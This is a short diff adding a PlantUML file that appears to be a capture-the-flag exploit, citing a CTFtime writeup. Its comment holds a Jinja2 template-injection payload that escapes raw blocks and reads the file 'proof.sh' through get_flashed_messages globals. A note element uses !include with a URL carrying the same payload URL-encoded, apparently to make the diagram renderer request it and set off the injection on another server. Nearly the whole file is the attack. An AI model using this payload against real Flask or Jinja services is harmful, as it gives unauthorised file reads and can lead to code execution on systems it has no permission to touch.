@@ -1,0 +1,10 @@
+@startuml
+/'
+https://plantuml.com/preprocessing#393335a6fd28a804
+https://ctftime.org/writeup/37173
+{% endraw %}{{ get_flashed_messages.__globals__.__builtins__.open("proof.sh").read() }}{% raw %}
+'/
+note left
+  !include http://puml.local/?puml=%7B%25%20endraw%20%25%7D%7B%7Bget_flashed_messages.__globals__.__builtins__.open%28%22proof.sh%22%29.read%28%29%7D%7D%7B%25%20raw%20%25%7D
+end note
+@enduml
